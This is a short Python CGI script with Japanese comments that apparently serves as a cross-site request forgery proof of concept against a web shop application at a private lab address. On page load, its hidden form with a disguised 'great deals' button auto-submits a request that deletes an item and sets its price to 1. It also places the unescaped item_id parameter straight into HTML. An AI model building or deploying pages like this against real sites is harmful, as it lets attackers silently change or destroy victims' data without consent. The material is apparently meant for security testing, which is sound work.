#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import cgi
import html
import cgitb # エラー表示のために追加

# エラー表示を有効にする
cgitb.enable()

def main():
    # CGI.FieldStorage() でGET/POSTデータを取得
    form = cgi.FieldStorage()

    # 'item_id' パラメータの値を取得します。
    # パラメータが存在しない場合は空文字列をデフォルト値とします。
    item_id = form.getfirst("item_id", "")

    # HTMLの出力ヘッダー
    print("Content-Type: text/html; charset=utf-8\n")

    # 取得した item_id を表示するHTML
    print(f"""<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>test page</title>
</head>
<body>
  <form action="http://192.168.146.128/purojitu/item_detail.cgi" method="POST">
    <input type="hidden" name="item_id" value={item_id}>
    <input type="hidden" name="action" value="delete_item">
    <input type="hidden" name="new_price" value="1"> <input type="submit" value="クリックするとお得な情報が！" style="display: none;">
</form>
<script>
    document.forms[0].submit(); // ページ表示と同時にフォームを自動送信
</script>
</body>
</html>

""")

if __name__ == "__main__":
    main()
